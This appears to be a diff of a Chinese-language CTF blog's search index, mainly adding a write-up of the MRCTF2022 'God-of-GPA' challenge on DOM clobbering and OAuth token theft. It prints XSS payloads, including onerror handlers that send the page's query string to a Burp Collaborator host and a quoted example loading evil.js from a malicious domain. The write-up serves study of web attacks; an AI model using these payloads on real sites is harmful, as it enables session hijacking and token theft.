@@ -500,6 +500,27 @@
 <td>Y</td>
 </tr>
 </tbody></table>
+<h2 id="day11-13"><a href="#day11-13" class="headerlink" title="day11~13"></a>day11~13</h2><p>推了个大飞</p>
+<h2 id="day14-4-25"><a href="#day14-4-25" class="headerlink" title="day14 4.25"></a>day14 4.25</h2><table>
+<thead>
+<tr>
+<th>misssion</th>
+<th>achieved</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>总结一下SSTI</td>
+<td></td>
+</tr>
+<tr>
+<td>pwn.college suid提权</td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+</tr>
+</tbody></table>
 <h2 id="长期任务"><a href="#长期任务" class="headerlink" title="长期任务"></a>长期任务</h2><table>
 <thead>
 <tr>
@@ -1004,5 +1025,129 @@
       <tags>
         <tag>xss</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>MRCTF2022</title>
+    <url>/2022/04/27/MRCTF2022/</url>
+    <content><![CDATA[<blockquote>
+<p><a href="http://brtserver.node2.buptmerak.cn/signin">http://brtserver.node2.buptmerak.cn/signin</a></p>
+</blockquote>
+<p>周末没打比赛 听说有个xss  现在有空来看看</p>
+<span id="more"></span>
+
+<h1 id="God-of-GPA"><a href="#God-of-GPA" class="headerlink" title="God-of-GPA"></a>God-of-GPA</h1><p>注册一个 jackma 123</p>
+<p>感觉这里有个xss</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">let</span> <span class="title class_">Img</span> =  <span class="variable language_">window</span>.<span class="property">MyImg</span> || &#123;<span class="attr">src</span>: <span class="string">&#x27;https://md.buptmerak.cn/uploads/upload_d12a3804a813ffb14fe38a318d6bfcf1.png&#x27;</span>&#125;</span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">let</span> <span class="title class_">Container</span> = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;div&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">  <span class="title class_">Container</span>.<span class="property">innerHTML</span> = <span class="string">&#x27;&lt;img class=&quot;avatar&quot; src=&quot;&#x27;</span> + <span class="title class_">Img</span>.<span class="property">src</span> + <span class="string">&#x27;&quot;&gt;&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(<span class="title class_">Container</span>);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Node/appendChild">https://developer.mozilla.org/zh-CN/docs/Web/API/Node/appendChild</a></p>
+<p>我们能不能动 <code>window.MyImg</code> ?  动的话是不是可以形成 dom xss</p>
+<p>这个 <code>window.MyImg</code> 怎么动</p>
+<p>想起了以前看过的dom clobbering</p>
+<p>学一下 dom clobbering</p>
+<p><a href="https://portswigger.net/web-security/dom-based/dom-clobbering">https://portswigger.net/web-security/dom-based/dom-clobbering</a></p>
+<p>可以看到这题和教学里的示范很相似</p>
+<p>接着读了读 zeddyu 大佬的文章</p>
+<p><a href="https://blog.zeddyu.info/2020/03/04/Dom-Clobbering/">https://blog.zeddyu.info/2020/03/04/Dom-Clobbering/</a></p>
+<p>下面直接把 portswigger上的相关介绍拉了下来</p>
+<h2 id="How-to-exploit-DOM-clobbering-vulnerabilities"><a href="#How-to-exploit-DOM-clobbering-vulnerabilities" class="headerlink" title="How to exploit DOM-clobbering vulnerabilities"></a>How to exploit DOM-clobbering vulnerabilities</h2><p>A common pattern used by JavaScript developers is:</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">var someObject = window.someObject || &#123;&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>If you can control some of the HTML on the page, you can clobber the <code>someObject</code> reference with a DOM node, such as an anchor. Consider the following code:</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">window</span>.<span class="property">onload</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">let</span> someObject = <span class="variable language_">window</span>.<span class="property">someObject</span> || &#123;&#125;;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">let</span> script = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;script&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">        script.<span class="property">src</span> = someObject.<span class="property">url</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(script);</span></span><br><span class="line"><span class="language-javascript">    &#125;;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>To exploit this vulnerable code, you could inject the following HTML to clobber the <code>someObject</code> reference with an anchor element:</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">someObject</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">someObject</span> <span class="attr">name</span>=<span class="string">url</span> <span class="attr">href</span>=<span class="string">//malicious-website.com/evil.js</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>As the two anchors use the same ID, the DOM groups them together in a DOM collection. The DOM clobbering vector then overwrites the <code>someObject</code> reference with this DOM collection. A <code>name</code> attribute is used on the last anchor element in order to clobber the <code>url</code> property of the <code>someObject</code> object, which points to an external script.</p>
+<p>相信看到这里大家都知道这题大概该怎么去打了</p>
+<p>我在本地构造了如下的payload</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">MyImg</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">MyImg</span> <span class="attr">name</span>=<span class="string">src</span> <span class="attr">href</span>=<span class="string">&quot;666&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">let</span> <span class="title class_">Img</span> =  <span class="variable language_">window</span>.<span class="property">MyImg</span> || &#123;<span class="attr">src</span>: <span class="string">&#x27;https://md.buptmerak.cn/uploads/upload_d12a3804a813ffb14fe38a318d6bfcf1.png&#x27;</span>&#125;</span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">let</span> <span class="title class_">Container</span> = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;div&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">  <span class="title class_">Container</span>.<span class="property">innerHTML</span> = <span class="string">&#x27;&lt;img class=&quot;avatar&quot; src=&quot;&#x27;</span> + <span class="title class_">Img</span>.<span class="property">src</span> + <span class="string">&#x27;&quot;&gt;&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(<span class="title class_">Container</span>);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>结果得到</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">class</span>=<span class="string">&quot;avatar&quot;</span> <span class="attr">src</span>=<span class="string">&quot;file:///E:/js/666&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>成功的进行了更改</p>
+<p>payload</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">MyImg</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">MyImg</span> <span class="attr">name</span>=<span class="string">src</span> <span class="attr">href</span>=<span class="string">&quot;cid:<span class="symbol">&amp;quot;</span>onerror=alert(1)//&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>接下来要考虑一下怎么拿flag</p>
+<p>我们现在可以进行xss  我们发现网站是使用的oauth认证的</p>
+<p>F12看了一下</p>
+<p>cookie中存的貌似是token  想办法拿到？</p>
+<figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">s:</span><span class="keyword">LSr</span>-HmP6ei-vlHd6bhypbfVcy-tcuf1u.E0UpQsNSFuW+jDPhGUxC845rhVCZKjeLYW2wtr7vq4Y</span><br></pre></td></tr></table></figure>
+
+
+
+<p>或者说直接让admin去点GPA再发到我的服务器上 然后xsleak出来可以吗？</p>
+<p>接着我发现了  认证时会请求</p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">GET <span class="regexp">/oauth/</span>authorize?redirect_uri=http:<span class="regexp">//</span>brtclient.node2.buptmerak.cn<span class="regexp">/login HTTP/</span><span class="number">1.1</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/login?token=TCHa62XCtDG7DmjKG4w2KSj1paWaZ1aX</span> <span class="meta">HTTP/1.1</span></span><br></pre></td></tr></table></figure>
+
+<p>然后会带token登录</p>
+<p>我尝试一下能不能拿到自己的token</p>
+<p>发现直接填我的vps会出现 <code>redirect_uri unmatched</code>  emmmm…</p>
+<p>怎么解决呢加个 <code>/login</code> ?</p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">GET <span class="regexp">/oauth/</span>authorize?redirect_uri=https:<span class="regexp">//</span><span class="number">0</span>abcw6idy8id19y0dsddg11ycpig65.burpcollaborator.net</span><br></pre></td></tr></table></figure>
+
+<p>好像还是不行？我想到了</p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">GET <span class="regexp">/oauth/</span>authorize?redirect_uri=http:<span class="regexp">//</span>brtclient.node2.buptmerak.cn<span class="regexp">/login&amp;redirect_uri=http:/</span><span class="regexp">/0abcw6idy8id19y0dsddg11ycpig65.burpcollaborator.net/</span> HTTP/<span class="number">1.1</span></span><br></pre></td></tr></table></figure>
+
+<p>md 报错了。。。</p>
+<p>想个办法绕一下</p>
+<p><a href="https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-an-open-redirect">https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-an-open-redirect</a></p>
+<p>那能不能导到他自己的网页上再写一个xss?</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">MyImg</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">MyImg</span> <span class="attr">name</span>=<span class="string">src</span> <span class="attr">href</span>=<span class="string">&quot;cid:<span class="symbol">&amp;quot;</span>onerror=window.location=&#x27;http://0abcw6idy8id19y0dsddg11ycpig65.burpcollaborator.net&#x27;+window.location.search.substring(1)//&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>这个是跳转的页面（上面的payload</p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span>brtserver.node2.buptmerak.cn<span class="regexp">/oauth/</span>authorize?redirect_uri=http:<span class="regexp">//</span>brtclient.node2.buptmerak.cn<span class="regexp">/view/</span><span class="number">85</span>d7da5b-b8a2-<span class="number">4734</span>-<span class="number">95</span>cb-<span class="number">6</span>e654f77ab61</span><br></pre></td></tr></table></figure>
+
+<p>再来个跳转到redirect的页面</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">MyImg</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">MyImg</span> <span class="attr">name</span>=<span class="string">src</span> <span class="attr">href</span>=<span class="string">&quot;cid:<span class="symbol">&amp;quot;</span>onerror=window.location=&#x27;http://brtserver.node2.buptmerak.cn/oauth/authorize?redirect_uri=http://brtclient.node2.buptmerak.cn/view/85d7da5b-b8a2-4734-95cb-6e654f77ab61&#x27;//&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>得到</p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">/view/</span><span class="number">17</span>c8aa93-<span class="number">827</span>d-<span class="number">4</span>c47-b525-a1e1d824a003</span><br></pre></td></tr></table></figure>
+
+<p>不知道为什么会报错 choa！~</p>
+<p>尝试了一下official wp 也g了  那就没事了   思路是一模一样 2333</p>
+<p>官方wp还有几种更好玩的玩法  </p>
+<p><a href="https://ibukifalling.github.io/2022/04/25/God-of-GPA-WP/">https://ibukifalling.github.io/2022/04/25/God-of-GPA-WP/</a></p>
+<p>总结一下</p>
+<p>学到了不少的东西  感觉很不错！美滋滋</p>
+]]></content>
+      <categories>
+        <category>WEB</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>SSTI总结</title>
+    <url>/2022/04/25/SSTI-learn/</url>
+    <content><![CDATA[<h1 id="SSTI相关知识总结"><a href="#SSTI相关知识总结" class="headerlink" title="SSTI相关知识总结"></a>SSTI相关知识总结</h1><p>第一次遇到 SSTi 的题目是在去年安恒三月赛中 那也是我第一次打CTF比赛？不知不觉一年已经过去了</p>
+<p>不同时期学习知识当然要有不同的体悟</p>
+<p>现在重新总结一下ssti 相关知识 希望可以得到新的体悟</p>
+<p>原理啥的这里我就不讨论了 网上介绍的一大堆</p>
+<p>重点关注一下 payload 和 绕过</p>
+]]></content>
+      <categories>
+        <category>web</category>
+      </categories>
+      <tags>
+        <tag>SSTI</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>xss-game</title>
+    <url>/2022/04/27/xss-game/</url>
+    <content><![CDATA[<p><a href="https://xss.pwnfunction.com/">https://xss.pwnfunction.com/</a></p>
+<p>新开一个坑 有空玩玩</p>
+<span id="more"></span>
+
+<p><a href="https://blog.zeddyu.info/2020/02/11/xssgame/#introduction">https://blog.zeddyu.info/2020/02/11/xssgame/#introduction</a></p>
+]]></content>
   </entry>
 </search>
